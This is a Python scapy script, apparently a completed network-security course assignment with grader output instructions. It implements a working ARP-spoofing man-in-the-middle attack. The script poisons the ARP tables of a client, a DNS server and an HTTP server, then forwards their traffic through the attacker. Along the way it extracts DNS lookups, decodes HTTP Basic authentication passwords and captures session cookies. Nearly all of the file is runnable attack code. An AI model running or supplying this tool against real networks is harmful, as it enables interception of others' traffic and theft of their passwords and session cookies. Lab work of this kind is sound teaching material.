from scapy.all import *

import argparse
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    
    # Create an ARP request asking "Who has IP?"
    arp_request = ARP(pdst=IP)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  # Send it to everyone
    arp_request_broadcast = broadcast / arp_request

    answered, unanswered = srp(arp_request_broadcast, timeout=2, verbose=0)

    for sent, received in answered:
        return received.hwsrc  # Return the MAC address from the reply

    return None  # In case no reply received


#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, httpServerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, clientMAC, httpServerIP, httpServerMAC) # TODO: Spoof httpServer ARP table
        spoof(dnsServerIP, dnsServerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, clientMAC, dnsServerIP, dnsServerMAC) # TODO: Spoof dnsServer ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    
    # Build a fake ARP reply
    packet = ARP(op=2,    # 2 = "is-at" (reply)
                 psrc=srcIP,  # Pretend to be srcIP
                 hwsrc=attackerMAC,  # But use attacker's MAC instead
                 pdst=dstIP,  # Target dstIP
                 hwdst=dstMAC)  # Target's real MAC

    send(packet, verbose=0)

    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    
    # Build a correct ARP reply
    packet = ARP(op=2,    # 2 = "is-at" (ARP reply)
                 psrc=srcIP,  # Correct srcIP
                 hwsrc=srcMAC,  # Real srcMAC (not attacker MAC)
                 pdst=dstIP,  # Target dstIP
                 hwdst=dstMAC)  # Target's real MAC

    # send(packet, count=5, verbose=0)
    send(packet, verbose=0)

    debug(f"restoring ARP table for {dstIP}")


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
# NOTE: beware of output requirements!
# Example output:
# # this is a comment that will be ignored by the grader
# *hostname:somehost.com.
# *hostaddr:1.2.3.4
# *basicauth:password
# *cookie:Name=Value
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC

    # We only care about packets sent to or from the attacker
    if not packet.haslayer(Ether) or not packet.haslayer(IP):
        return  # Ignore non-IP packets

    eth = packet[Ether]
    ip = packet[IP]

    # 1. DNS Query
    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # qr == 0 → query
        query_name = packet[DNSQR].qname.decode()
        print(f"*hostname:{query_name.strip()}")
        sys.stdout.flush()

    # 2. DNS Response
    if packet.haslayer(DNS) and packet[DNS].qr == 1:  # qr == 1 → response
        if packet[DNS].an is not None:
            answer_ip = packet[DNS].an.rdata
            print(f"*hostaddr:{answer_ip}")
            sys.stdout.flush()

    # 3. HTTP Request (client → webserver)
    if packet.haslayer(TCP) and packet[TCP].dport == 80:
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode(errors='ignore')
            if "Authorization: Basic" in payload:
                lines = payload.split("\r\n")
                for line in lines:
                    if "Authorization: Basic" in line:
                        # Extract base64-encoded credentials
                        creds = line.split(" ")[-1].strip()
                        # Decode Base64 credentials
                        import base64
                        decoded_creds = base64.b64decode(creds).decode()
                        # Extract password part
                        username, password = decoded_creds.split(":", 1)
                        print(f"*basicauth:{password}")
                        sys.stdout.flush()

    # 4. HTTP Response (webserver → client)
    if packet.haslayer(TCP) and packet[TCP].sport == 80:
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode(errors='ignore')
            if "Set-Cookie:" in payload:
                lines = payload.split("\r\n")
                for line in lines:
                    if "Set-Cookie:" in line:
                        cookie_value = line.split(":", 1)[1].strip()
                        print(f"*cookie:{cookie_value}")
                        sys.stdout.flush()

    # 5. Forward the packet properly
    # If the packet is from client
    if eth.src == clientMAC:
        eth.dst = dnsServerMAC if ip.dst == dnsServerIP else httpServerMAC
    # If the packet is from server
    elif eth.src == dnsServerMAC or eth.src == httpServerMAC:
        eth.dst = clientMAC
    else:
        return  # Ignore packets not from or to client/DNS/HTTP server

    eth.src = attackerMAC  # Always set our MAC as source
    sendp(packet, verbose=0)



if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
